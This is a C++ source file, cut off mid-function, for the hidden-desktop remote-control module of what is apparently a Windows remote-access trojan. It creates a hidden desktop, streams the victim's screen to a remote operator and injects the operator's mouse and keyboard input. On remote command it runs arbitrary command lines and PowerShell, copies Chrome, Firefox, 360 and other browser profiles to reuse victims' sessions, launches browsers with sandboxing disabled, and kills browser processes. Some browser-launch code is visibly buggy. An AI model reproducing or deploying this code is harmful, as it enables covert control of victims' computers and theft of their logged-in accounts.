// ScreenManagers.cpp: implementation of the CScreenHideManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include <Windowsx.h>
#include "ScreenHideManager.h"
#include <WinUser.h>  
#include <string>
#include <Shlwapi.h>
#include <ShlObj.h>
#include <Tlhelp32.h>
#pragma comment (lib, "Shlwapi.lib")
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
using namespace std;
static HDESK      g_hDesk;
static TCHAR       g_desktopName[MAX_PATH];

void* Alloc(size_t size)
{
	void* mem = malloc(size);
	return mem;
}

#pragma function(memset)
void* __cdecl memset(void* pTarget, int value, size_t cbTarget)
{
	unsigned char* p = static_cast<unsigned char*>(pTarget);
	while (cbTarget-- > 0)
	{
		*p++ = static_cast<unsigned char>(value);
	}
	return pTarget;
}

ULONG PseudoRand(ULONG* seed)
{
	return (*seed = 1352459 * (*seed) + 2529004207);
}

void GetBotId(TCHAR* botId)
{
	TCHAR windowsDirectory[MAX_PATH];
	TCHAR volumeName[8] = { 0 };
	DWORD seed = 0;

	if (GetWindowsDirectory(windowsDirectory, sizeof(windowsDirectory)))
		windowsDirectory[0] = _T('C');

	volumeName[0] = windowsDirectory[0];
	volumeName[1] = _T(':');
	volumeName[2] = _T('\\');
	volumeName[3] = _T('\0');

	GetVolumeInformation(volumeName, NULL, 0, &seed, 0, NULL, NULL, 0);

	GUID guid;
	guid.Data1 = PseudoRand(&seed);

	guid.Data2 = (USHORT)PseudoRand(&seed);
	guid.Data3 = (USHORT)PseudoRand(&seed);
	for (int i = 0; i < 8; i++)
		guid.Data4[i] = (UCHAR)PseudoRand(&seed);
	wsprintf(botId, _T("%08lX%04lX%lu"), guid.Data1, guid.Data3, *(ULONG*)&guid.Data4[2]);
}

void CopyDir(TCHAR* from, TCHAR* to)
{
	TCHAR fromWildCard[MAX_PATH] = { 0 };
	lstrcpy(fromWildCard, from);
	lstrcat(fromWildCard, _T("\\*"));

	if (!CreateDirectory(to, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
		return;
	WIN32_FIND_DATA findData;
	HANDLE hFindFile = FindFirstFile(fromWildCard, &findData);
	if (hFindFile == INVALID_HANDLE_VALUE)
		return;

	do
	{
		TCHAR currFileFrom[MAX_PATH] = { 0 };
		lstrcpy(currFileFrom, from);
		lstrcat(currFileFrom, _T("\\"));
		lstrcat(currFileFrom, findData.cFileName);

		TCHAR currFileTo[MAX_PATH] = { 0 };
		lstrcpy(currFileTo, to);
		lstrcat(currFileTo, _T("\\"));
		lstrcat(currFileTo, findData.cFileName);

		if
			(
				findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY &&
				_tcscmp(findData.cFileName, _T(".")) &&
				_tcscmp(findData.cFileName, _T(".."))
				)
		{
			if (CreateDirectory(currFileTo, NULL) || GetLastError() == ERROR_ALREADY_EXISTS)
				CopyDir(currFileFrom, currFileTo);
		}
		else
			CopyFile(currFileFrom, currFileTo, FALSE);
	} while (FindNextFile(hFindFile, &findData));
}

void killproc(const TCHAR* name)
{
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Process32First(hSnapShot, &pEntry);
	while (hRes)
	{
		if (_tcscmp(pEntry.szExeFile, name) == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
				(DWORD)pEntry.th32ProcessID);
			if (hProcess != NULL)
			{
				TerminateProcess(hProcess, 9);
				CloseHandle(hProcess);
			}
		}
		hRes = Process32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);
}
CScreenHideManager::CScreenHideManager(ISocketBase* pClient) :CManager(pClient)
{
	m_buser = FALSE;
	m_biBitCount = 32;
	m_fps = 1;
	m_bIsWorking = true;
	m_bIsCaptureLayer = false;
	m_hDeskTopDC = GetDC(GetDesktopWindow());
	m_oldwidth = ::GetSystemMetrics(SM_CXVIRTUALSCREEN);
	m_oldheigh = ::GetSystemMetrics(SM_CYVIRTUALSCREEN);
	m_MYtagMSG = nullptr;
	m_MYtagMSGsize = sizeof(MYtagMSG);
	m_hWorkThread = (HANDLE)_beginthreadex(NULL, 0, WorkThread, this, 0, NULL);
	m_hBlankThread = (HANDLE)_beginthreadex(NULL, 0, ControlThread, this, 0, NULL);
	m_buser = TRUE;
}

CScreenHideManager::~CScreenHideManager()
{
	if (!m_buser) return;
	m_oldwidth = 0;
	m_oldheigh = 0;
	InterlockedExchange((LPLONG)&m_bIsWorking, false);
	WaitForSingleObject(m_hWorkThread, INFINITE);
	WaitForSingleObject(m_hBlankThread, INFINITE);
	CloseHandle(m_hWorkThread);
	CloseHandle(m_hBlankThread);
	ReleaseDC(NULL, m_hDeskTopDC);
	SAFE_DELETE(m_pScreenSpy);
	
}

void CScreenHideManager::ResetScreen(int biBitCount)
{
	InterlockedExchange((LPLONG)&m_bIsWorking, FALSE);
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);
	SAFE_DELETE(m_pScreenSpy);
	m_biBitCount = 32;
	m_hWorkThread = (HANDLE)_beginthreadex(NULL, 0, WorkThread, this, 0, NULL);
}


void CScreenHideManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (lpBuffer[0] == TOKEN_HEARTBEAT) return;
	switch (lpBuffer[0])
	{
	case COMMAND_FLUSH_HIDE:
		ResetScreen(32);
		break;
	case COMMAND_SCREEN_CONTROL_HIDE:
	{
		ProcessCommand(lpBuffer + 1, nSize - 1);
	}
	break;
	case COMMAND_NEXT_HIDE:
		// 通知内核远程控制端对话框已打开，WaitForDialogOpen可以返回
		NotifyDialogIsOpen();
		break;
	case COMMAND_SCREEN_RESET_HIDE:
		ResetScreen(*(LPBYTE)&lpBuffer[1]);
		break;
	case COMMAND_SCREEN_FPS_HIDE:
	{
		m_fps = (int)(*(LPBYTE)&lpBuffer[1]);
		m_pScreenSpy->SetFps(m_fps);
	}
	break;
	case COMMAND_SCREEN_GET_CLIPBOARD_HIDE:
		SendLocalClipboard();
		break;
	case COMMAND_SCREEN_SET_CLIPBOARD_HIDE:
		UpdateLocalClipboard((char*)lpBuffer + 1, nSize - 1);
		break;

	case COMMAND_SCREEN_SETSCREEN_HIDE:
	{
		Loop_Screen();
	}
	break;
	case COMMAND__SCREEN_ALGORITHM_RESET_HIDE:
		m_bAlgorithm = *(LPBYTE)&lpBuffer[1];
		m_pScreenSpy->setAlgorithm(m_bAlgorithm);
		break;
	case COMMAND_COMMAND_SCREENUALITY60_HIDE:
		m_pScreenSpy->SendUALITY(60);
		break;
	case COMMAND_COMMAND_SCREENUALITY85_HIDE:
		m_pScreenSpy->SendUALITY(85);
		break;
	case COMMAND_COMMAND_SCREENUALITY100_HIDE:
		m_pScreenSpy->SendUALITY(100);
		break;
	
	case COMMAND_HIDE_USER:
	{
		switch (lpBuffer[1])
		{
		case 0:
		{
			const DWORD neverCombine = 2;
			const TCHAR* valueName = _T("TaskbarGlomLevel");

			HKEY hKey;
			RegOpenKeyEx(HKEY_CURRENT_USER, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"), 0, KEY_ALL_ACCESS, &hKey);
			DWORD value;
			DWORD size = sizeof(DWORD);
			DWORD type = REG_DWORD;
			RegQueryValueEx(hKey, valueName, 0, &type, (BYTE*)&value, &size);

			if (value != neverCombine)
				RegSetValueEx(hKey, valueName, 0, REG_DWORD, (BYTE*)&neverCombine, size);

			TCHAR explorerPath[MAX_PATH] = { 0 };
			GetWindowsDirectory(explorerPath, MAX_PATH);
			lstrcat(explorerPath, _T("\\"));
			lstrcat(explorerPath, _T("explorer.exe"));

			STARTUPINFO startupInfo = { 0 };
			startupInfo.cb = sizeof(startupInfo);
			startupInfo.lpDesktop = g_desktopName;
			PROCESS_INFORMATION processInfo = { 0 };
			CreateProcess(explorerPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);

			APPBARDATA appbarData;
			appbarData.cbSize = sizeof(appbarData);
			for (int i = 0; i < 5; ++i)
			{
				Sleep(1000);
				appbarData.hWnd = FindWindow(_T("shell_TrayWnd"), NULL);
				if (appbarData.hWnd)
					break;
			}

			appbarData.lParam = ABS_ALWAYSONTOP;
			SHAppBarMessage(ABM_SETSTATE, &appbarData);

			RegSetValueEx(hKey, valueName, 0, REG_DWORD, (BYTE*)&value, size);
			RegCloseKey(hKey);
		}
		break;
		case 1:
		{
			TCHAR rundllPath[MAX_PATH] = { 0 };
			SHGetFolderPath(NULL, CSIDL_SYSTEM, NULL, 0, rundllPath);
			lstrcat(rundllPath, _T("\\rundll32.exe shell32.dll,#61"));
			STARTUPINFO startupInfo = { 0 };
			startupInfo.cb = sizeof(startupInfo);
			startupInfo.lpDesktop = g_desktopName;
			PROCESS_INFORMATION processInfo = { 0 };
			CreateProcess(NULL, rundllPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
		}
		break;
		case 2:
		{


			TCHAR path[MAX_PATH] = { 0 };
			lstrcat(path, _T("cmd.exe /c start powershell -noexit -command \"[console]::windowwidth = 100;[console]::windowheight = 30; [console]::bufferwidth = [console]::windowwidth\""));
			STARTUPINFO startupInfo = { 0 };
			startupInfo.cb = sizeof(startupInfo);
			startupInfo.lpDesktop = g_desktopName;
			PROCESS_INFORMATION processInfo = { 0 };
			CreateProcess(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
		}
		break;
		case 3:
		{
			TCHAR chromePath[MAX_PATH] = { 0 };
			SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, chromePath);
			lstrcat(chromePath, _T("\\Google\\Chrome\\"));

			TCHAR dataPath[MAX_PATH] = { 0 };
			lstrcat(dataPath, chromePath);
			lstrcat(dataPath, _T("User Data\\"));

			TCHAR botId[35] = { 0 };
			TCHAR newDataPath[MAX_PATH] = { 0 };
			lstrcat(newDataPath, chromePath);
			GetBotId(botId);
			lstrcat(newDataPath, botId);

			CopyDir(dataPath, newDataPath);

			TCHAR path[MAX_PATH] = { 0 };
			lstrcat(path, _T("cmd.exe /c start "));
			lstrcat(path, _T("chrome.exe"));
			lstrcat(path, _T(" --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11  --origin-trial-disabled-features=SecurePaymentConfirmation --user-data-dir="));
			lstrcat(path, _T("\""));
			lstrcat(path, newDataPath);

			STARTUPINFO startupInfo = { 0 };
			startupInfo.cb = sizeof(startupInfo);
			startupInfo.lpDesktop = g_desktopName;
			PROCESS_INFORMATION processInfo = { 0 };
			CreateProcess(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
		}
		break;
		case 4:
		{
			TCHAR path[MAX_PATH] = { 0 };
			lstrcat(path, _T("cmd.exe /c start "));
			lstrcat(path, _T("msedge.exe"));
			lstrcat(path, _T(" --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir="));


			STARTUPINFO startupInfo = { 0 };
			startupInfo.cb = sizeof(startupInfo);
			startupInfo.lpDesktop = g_desktopName;
			PROCESS_INFORMATION processInfo = { 0 };
			CreateProcess(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
		}
		break;
		case 5:
		{
			killproc(_T("brave.exe"));
			TCHAR path[MAX_PATH] = { 0 };
			lstrcat(path, _T("cmd.exe /c start "));
			lstrcat(path, _T("brave.exe"));
			lstrcat(path, _T(" --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir="));
			STARTUPINFO startupInfo = { 0 };
			startupInfo.cb = sizeof(startupInfo);
			startupInfo.lpDesktop = g_desktopName;
			PROCESS_INFORMATION processInfo = { 0 };
			CreateProcess(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
		}
		break;
		case 6:
		{
			TCHAR firefoxPath[MAX_PATH] = { 0 };
			SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, firefoxPath);
			lstrcat(firefoxPath, _T("\\Mozilla\\Firefox\\"));

			TCHAR profilesIniPath[MAX_PATH] = { 0 };
			lstrcat(profilesIniPath, firefoxPath);
			lstrcat(profilesIniPath, _T("TaskbarGlomLevel"));

			HANDLE hProfilesIni = CreateFile
			(
				profilesIniPath,
				FILE_READ_ACCESS,
				FILE_SHARE_READ | FILE_SHARE_WRITE,
				NULL,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL,
				NULL
			);
			if (hProfilesIni == INVALID_HANDLE_VALUE)
				return;

			DWORD profilesIniSize = GetFileSize(hProfilesIni, 0);
			DWORD read;
			TCHAR* profilesIniContent = new TCHAR[profilesIniSize + 1];
			ReadFile(hProfilesIni, profilesIniContent, profilesIniSize, &read, NULL);
			profilesIniContent[profilesIniSize] = 0;


			TCHAR* isRelativeRead = StrStr(profilesIniContent, _T("IsRelative="));
			if (!isRelativeRead)
			{
				CloseHandle(hProfilesIni);
				SAFE_DELETE(profilesIniContent);
				return;
			}

			isRelativeRead += 11;
			BOOL isRelative = (*isRelativeRead == _T('1'));

			TCHAR* path = StrStr(profilesIniContent, _T("Path="));
			if (!path)
			{
				CloseHandle(hProfilesIni);
				SAFE_DELETE(profilesIniContent);
				return;
			}
			TCHAR* pathEnd = StrStr(path, _T("\r"));
			if (!pathEnd)
			{
				CloseHandle(hProfilesIni);
				SAFE_DELETE(profilesIniContent);
				return;
			}
			*pathEnd = 0;
			path += 5;

			TCHAR realPath[MAX_PATH] = { 0 };
			if (isRelative)
				lstrcpy(realPath, firefoxPath);
			lstrcat(realPath, path);

			TCHAR botId[35];
			GetBotId(botId);

			TCHAR newPath[MAX_PATH];
			lstrcpy(newPath, firefoxPath);
			lstrcpy(newPath, botId);

			CopyDir(realPath, newPath);

			TCHAR browserPath[MAX_PATH] = { 0 };
			lstrcpy(browserPath, _T("cmd.exe /c start "));
			lstrcpy(browserPath, _T("firefox.exe"));
			lstrcpy(browserPath, _T(" -no-remote -profile "));
			lstrcpy(browserPath, _T("\""));
			lstrcpy(browserPath, newPath);
			lstrcpy(browserPath, _T("\""));

			STARTUPINFO startupInfo = { 0 };
			startupInfo.cb = sizeof(startupInfo);
			startupInfo.lpDesktop = g_desktopName;
			PROCESS_INFORMATION processInfo = { 0 };
			CreateProcess(NULL, browserPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);


		}
		break;
		case 7:
		{
			TCHAR path[MAX_PATH] = { 0 };
			lstrcpy(path, _T("cmd.exe /c start "));
			lstrcat(path, _T("iexplore.exe"));

			STARTUPINFO startupInfo = { 0 };
			startupInfo.cb = sizeof(startupInfo);
			startupInfo.lpDesktop = g_desktopName;
			PROCESS_INFORMATION processInfo = { 0 };
			CreateProcess(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);



		}
		break;

		case 8:
		{
			TCHAR path[MAX_PATH] = { 0 };
			lstrcpy(path, (TCHAR*)((char*)lpBuffer + 2));
			STARTUPINFO startupInfo = { 0 };
			startupInfo.cb = sizeof(startupInfo);
			startupInfo.lpDesktop = g_desktopName;
			PROCESS_INFORMATION processInfo = { 0 };
			CreateProcess(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
		}
		break;

		case 9:
		{
			ZdyCmd* m_ZdyCmd = new ZdyCmd;
			ZeroMemory(m_ZdyCmd, sizeof(ZdyCmd));
			memcpy(m_ZdyCmd, (char*)lpBuffer + 2, sizeof(ZdyCmd));
			CopyDir(m_ZdyCmd->oldpath, m_ZdyCmd->newpath);

			TCHAR path[MAX_PATH] = { 0 };
			lstrcpy(path, _T("cmd.exe /c start "));
			lstrcat(path, m_ZdyCmd->cmdline);
			lstrcat(path, _T(" --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir="));
			lstrcat(path, _T("\""));
			lstrcat(path, m_ZdyCmd->newpath);
			STARTUPINFO startupInfo = { 0 };
			startupInfo.cb = sizeof(startupInfo);
			startupInfo.lpDesktop = g_desktopName;
			PROCESS_INFORMATION processInfo = { 0 };
			CreateProcess(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
			delete m_ZdyCmd;
		}
		break;
		case 10:
		{
			TCHAR chromePath[MAX_PATH] = { 0 };
			SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, chromePath);
			lstrcat(chromePath, _T("\\360Chrome\\Chrome\\"));
			TCHAR dataPath[MAX_PATH] = { 0 };
			lstrcpy(dataPath, chromePath);
			lstrcat(dataPath, _T("User Data\\"));

			TCHAR botId[35] = { 0 };
			TCHAR newDataPath[MAX_PATH] = { 0 };
			lstrcpy(newDataPath, chromePath);
			GetBotId(botId);
			lstrcat(newDataPath, botId);

			CopyDir(dataPath, newDataPath);

			TCHAR path[MAX_PATH] = { 0 };
			lstrcpy(path, _T("cmd.exe /c start "));
			lstrcat(path, _T("360chrome.exe"));
			lstrcat(path, _T(" --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir="));
			lstrcat(path, _T("\""));
			lstrcat(path, newDataPath);

			STARTUPINFO startupInfo = { 0 };
			startupInfo.cb = sizeof(startupInfo);
			startupInfo.lpDesktop = g_desktopName;
			PROCESS_INFORMATION processInfo = { 0 };
			CreateProcess(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
		}
		break;
		case 11:
		{
			TCHAR chromePath[MAX_PATH] = { 0 };

			SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, chromePath);
			lstrcat(chromePath, _T("\\"));


			TCHAR dataPath[MAX_PATH] = { 0 };
			lstrcpy(dataPath, chromePath);
			lstrcat(dataPath, _T("secoresdk\\"));

			TCHAR botId[35] = { 0 };
			TCHAR newDataPath[MAX_PATH] = { 0 };
			lstrcpy(newDataPath, chromePath);
			GetBotId(botId);
			lstrcat(newDataPath, botId);

			CopyDir(dataPath, newDataPath);
			lstrcat(newDataPath, _T("\\360se6\\Application\\360se.exe"));

			TCHAR path[MAX_PATH] = { 0 };
			lstrcpy(path, _T("cmd.exe /c start "));
			lstrcat(path, newDataPath);

			lstrcat(path, _T(" --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir="));

			STARTUPINFO startupInfo = { 0 };
			startupInfo.cb = sizeof(startupInfo);
			startupInfo.lpDesktop = g_desktopName;
			PROCESS_INFORMATION processInfo = { 0 };
			CreateProcess(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
		}
		break;
		case 12:
		{
			TCHAR chromePath[MAX_PATH] = { 0 };

			SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, chromePath);
			lstrcat(chromePath, _T("\\"));


			TCHAR dataPath[MAX_PATH] = { 0 };
			lstrcpy(dataPath, chromePath);
			lstrcat(dataPath, _T("360se6\\"));

			TCHAR botId[35] = { 0 };
			TCHAR newDataPath[MAX_PATH] = { 0 };
			lstrcpy(newDataPath, chromePath);
			GetBotId(botId);
			lstrcat(newDataPath, botId);

			CopyDir(dataPath, newDataPath);
			lstrcat(newDataPath, _T("\\Application\\360se.exe"));

			TCHAR path[MAX_PATH] = { 0 };
			lstrcpy(path, _T("cmd.exe /c start "));
			lstrcat(path, newDataPath);

			lstrcat(path, _T(" --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir="));

			STARTUPINFO startupInfo = { 0 };
			startupInfo.cb = sizeof(startupInfo);
			startupInfo.lpDesktop = g_desktopName;
			PROCESS_INFORMATION processInfo = { 0 };
			CreateProcess(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
		}
		break;

		case 31:
		{

		}
		break;
		case 32:
		{

		}
		break;
		case 33:
		{

		}
		break;
		case 34:
		{

		}
		break;


		default:
			break;
		}
	}
	break;
	case COMMAND_HIDE_CLOSE:
	{
		CloseDesktop(g_hDesk);
	}
	break;
	default:
		Trace("OnReceive default--------\n");
		break;
	}


}

void CScreenHideManager::sendBITMAPINFO()
{
	DWORD	dwBytesLength = 1 + m_pScreenSpy->getBitmapInfoSize();
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	lpBuffer[0] = TOKEN_BITMAPINFO_HIDE;
	memcpy(lpBuffer + 1, m_pScreenSpy->getBitmapInfo(), dwBytesLength - 1);
	Send(lpBuffer, dwBytesLength);
	SAFE_DELETE_AR(lpBuffer);
}

void CScreenHideManager::sendsize()
{
	RECT m_rect;
	m_rect.left = m_pScreenSpy->m_iScreenX;
	m_rect.top = m_pScreenSpy->m_iScreenY;
	m_rect.right = m_pScreenSpy->m_nFullWidth;
	m_rect.bottom = m_pScreenSpy->m_nFullHeight;
	LPBYTE	lpBuffer = new BYTE[sizeof(RECT) + 1];
	lpBuffer[0] = TOKEN_SIZE_HIDE;
	memcpy(lpBuffer + 1, &m_rect, sizeof(RECT));
	Send(lpBuffer, sizeof(RECT) + 1);
	SAFE_DELETE_AR(lpBuffer);
}

void CScreenHideManager::sendFirstScreen()
{
	LPVOID	lpFirstScreen = NULL;
	DWORD	dwBytes;
	lpFirstScreen = m_pScreenSpy->getFirstScreen(&dwBytes);
	if (dwBytes == 0 || !lpFirstScreen)
		return;
	unsigned long	destLen = (unsigned long)((double)dwBytes * 1.001 + 12);
	LPBYTE			pDest = new BYTE[destLen];
	if (pDest == NULL) 		return;
	if (compress(pDest, &destLen, (byte*)lpFirstScreen, dwBytes) != Z_OK)
	{
		SAFE_DELETE_AR(pDest);
		return;
	}
	DWORD	dwBytesLength = 1 + destLen + 4;
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
		return;
	lpBuffer[0] = TOKEN_FIRSTSCREEN_HIDE;
	memcpy(lpBuffer + 1, &dwBytes, 4);
	memcpy(lpBuffer + 5, pDest, destLen);
	Send(lpBuffer, dwBytesLength);
	SAFE_DELETE_AR(lpBuffer);
	SAFE_DELETE_AR(pDest);

}

void CScreenHideManager::sendNextScreen()
{
	LPVOID	lpNetScreen = NULL;
	DWORD	dwBytes;
	lpNetScreen = m_pScreenSpy->getNextScreen(&dwBytes);

	if (dwBytes == 0 || !lpNetScreen)
		return;

	unsigned long	destLen = (unsigned long)((double)dwBytes * 1.001 + 12);
	LPBYTE			pDest = new BYTE[destLen];
	if (pDest == NULL) 		return;
	if (compress(pDest, &destLen, (byte*)lpNetScreen, dwBytes) != Z_OK)
	{
		SAFE_DELETE_AR(pDest);
		return;
	}
	DWORD	dwBytesLength = 1 + destLen + 4;
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (!lpBuffer)
		return;
	lpBuffer[0] = TOKEN_NEXTSCREEN_HIDE;
	memcpy(lpBuffer + 1, &dwBytes, 4);
	memcpy(lpBuffer + 5, (const char*)pDest, destLen);

	Send(lpBuffer, dwBytesLength);
	SAFE_DELETE_AR(lpBuffer);
	SAFE_DELETE_AR(pDest);
}

unsigned CScreenHideManager::WorkThread(LPVOID lparam)
{
	CScreenHideManager* pThis = (CScreenHideManager*)lparam;
	memset(g_desktopName, 0, sizeof(g_desktopName));
	GetBotId(g_desktopName);
	//lstrcat(g_desktopName, _T("Winlogon"));
	g_hDesk = OpenDesktop(_T("Winlogon"), 0, TRUE, GENERIC_ALL);
	if (!g_hDesk)
	{
		g_hDesk = CreateDesktop(g_desktopName, NULL, NULL, 0, GENERIC_ALL, NULL);
		TCHAR szExplorerFile[MAX_PATH * 2] = { 0 };
		GetWindowsDirectory(szExplorerFile, MAX_PATH * 2 - 1);
		_tcscat_s(szExplorerFile, MAX_PATH * 2 - 1, _T("\\Explorer.Exe"));
		pThis->LaunchApplication(szExplorerFile, g_desktopName);
	}
	SetThreadDesktop(g_hDesk);
	pThis->m_pScreenSpy = new CScreenSpy(g_hDesk);
	pThis->m_pScreenSpy->SetFps(pThis->m_fps);
	pThis->sendBITMAPINFO();
	// 等控制端对话框打开
	if (pThis->m_bIsWorking) 	pThis->WaitForDialogOpen();
	pThis->sendsize();
	pThis->sendFirstScreen();
	pThis->m_bIsWorking = true;
	while (pThis->m_bIsWorking)
	{
		pThis->sendNextScreen();
	}

	return 0;
}

// 创建这个线程主要是为了保持一直黑屏
unsigned CScreenHideManager::ControlThread(LPVOID lparam)
{
	CScreenHideManager* pThis = (CScreenHideManager*)lparam;
	pThis->WaitForDialogOpen();
	while (pThis->IsConnect())
	{
		// 分辨率大小改变了
		if (pThis->IsMetricsChange() && pThis->m_bIsWorking)
		{
			pThis->ResetScreen(pThis->GetCurrentPixelBits());
			Sleep(2000);
		}
		Sleep(10);
	}
	return -1;
}

#if !defined(GET_WHEEL_DELTA_WPARAM)
#define GET_WHEEL_DELTA_WPARAM(wParam) ((short)HIWORD(wParam))
#endif

void CScreenHideManager::ProcessCommand(LPBYTE lpBuffer, UINT nSize)
{
	if (nSize % m_MYtagMSGsize != 0)
		return;
	HWND  hWnd;
	BOOL  mouseMsg = FALSE;
	POINT lastPointCopy;
	SetThreadDesktop(g_hDesk);
	int	nCount = nSize / m_MYtagMSGsize;
	for (int i = 0; i < nCount; i++)
	{
		m_MYtagMSG = (MYtagMSG*)(lpBuffer + i * m_MYtagMSGsize);
		switch (m_MYtagMSG->message)
		{
		case WM_KEYUP:
			return;
		case WM_CHAR:

		case WM_KEYDOWN:
		{
			point = lastPoint;
			hWnd = WindowFromPoint(point);
			break;
		}
		default:

		{
			mouseMsg = TRUE;
			//point.x = GET_X_LPARAM(m_MYtagMSG->lParam);
			//point.y = GET_Y_LPARAM(m_MYtagMSG->lParam);
			point.x = m_MYtagMSG->x;
			point.y = m_MYtagMSG->y;
			lastPointCopy = lastPoint;
			lastPoint = point;
			hWnd = WindowFromPoint(point);
			if (m_MYtagMSG->message == WM_LBUTTONUP)
			{
				lmouseDown = FALSE;
				LRESULT lResult = SendMessageA(hWnd, WM_NCHITTEST, NULL, m_MYtagMSG->lParam);

				switch (lResult)
				{
				case HTTRANSPARENT:
				{
					SetWindowLongA(hWnd, GWL_STYLE, GetWindowLongA(hWnd, GWL_STYLE) | WS_DISABLED);
					lResult = SendMessageA(hWnd, WM_NCHITTEST, NULL, m_MYtagMSG->lParam);
					break;
				}
				case HTCLOSE:
				{
					PostMessageA(hWnd, WM_CLOSE, 0, 0);
					break;
				}
				case HTMINBUTTON:
				{
					PostMessageA(hWnd, WM_SYSCOMMAND, SC_MINIMIZE, 0);
					break;
				}
				case HTMAXBUTTON:
				{
					WINDOWPLACEMENT windowPlacement;
					windowPlacement.length = sizeof(windowPlacement);
					GetWindowPlacement(hWnd, &windowPlacement);
					if (windowPlacement.flags & SW_SHOWMAXIMIZED)
						PostMessageA(hWnd, WM_SYSCOMMAND, SC_RESTORE, 0);
					else
						PostMessageA(hWnd, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
					break;
				}
				}
			}
			else if (m_MYtagMSG->message == WM_LBUTTONDOWN)
			{
				lmouseDown = TRUE;
				hResMoveWindow = NULL;

				RECT startButtonRect;
				HWND hStartButton = FindWindowA((PCHAR)"Button", NULL);
				GetWindowRect(hStartButton, &startButtonRect);
				if (PtInRect(&startButtonRect, point))
				{
					PostMessageA(hStartButton, BM_CLICK, 0, 0);
					continue;
				}
				else
				{
					char windowClass[MAX_PATH] = { 0 };
					RealGetWindowClassA(hWnd, windowClass, MAX_PATH);

					if (!lstrcmpA(windowClass, "#32768"))
					{
						HMENU hMenu = (HMENU)SendMessageA(hWnd, MN_GETHMENU, 0, 0);
						int itemPos = MenuItemFromPoint(NULL, hMenu, point);
						int itemId = GetMenuItemID(hMenu, itemPos);
						PostMessageA(hWnd, 0x1e5, itemPos, 0);
						PostMessageA(hWnd, WM_KEYDOWN, VK_RETURN, 0);
						continue;
					}
				}
			}
			else if (m_MYtagMSG->message == WM_MOUSEMOVE)
			{
				if (!lmouseDown)
					continue;

				if (!hResMoveWindow)
					resMoveType = SendMessageA(hWnd, WM_NCHITTEST, NULL, m_MYtagMSG->lParam);
				else
					hWnd = hResMoveWindow;

				int moveX = lastPointCopy.x - point.x;
				int moveY = lastPointCopy.y - point.y;

				RECT rect;
				GetWindowRect(hWnd, &rect);

				int x = rect.left;
				int y = rect.top;
				int width = rect.right - rect.left;
				int height = rect.bottom - rect.top;
				switch (resMoveType)
				{
				case HTCAPTION:
				{
					x -= moveX;
					y -= moveY;
					break;
				}
				case HTTOP:
				{
					y -= moveY;
					height += moveY;
					break;
				}
				case HTBOTTOM:
				{
					height -= moveY;
					break;
				}
				case HTLEFT:
				{
					x -= moveX;
					width += moveX;
					break;
				}
				case HTRIGHT:
				{
					width -= moveX;
					break;
				}
				case HTTOPLEFT:
				{
					y -= moveY;
					height += moveY;
					x -= moveX;
					width += moveX;
					break;
				}
				case HTTOPRIGHT:
				{
					y -= moveY;
					height += moveY;
					width -= moveX;
					break;
				}
				case HTBOTTOMLEFT:
				{
					height -= moveY;
					x -= moveX;
					width += moveX;
					break;
				}
				case HTBOTTOMRIGHT:
				{
					height -= moveY;
					width -= moveX;
					break;
				}
				default:
					continue;
				}
				MoveWindow(hWnd, x, y, width, height, FALSE);
				hResMoveWindow = hWnd;
				continue;
			}
			break;
		}
		}
		for (HWND currHwnd = hWnd;;)
		{
			hWnd = currHwnd;
			ScreenToClient(currHwnd, &point);
			currHwnd = ChildWindowFromPoint(currHwnd, point);
			if (!currHwnd || currHwnd == hWnd)
				break;
		}
		if (mouseMsg)
			m_MYtagMSG->lParam = MAKELPARAM(point.x, point.y);

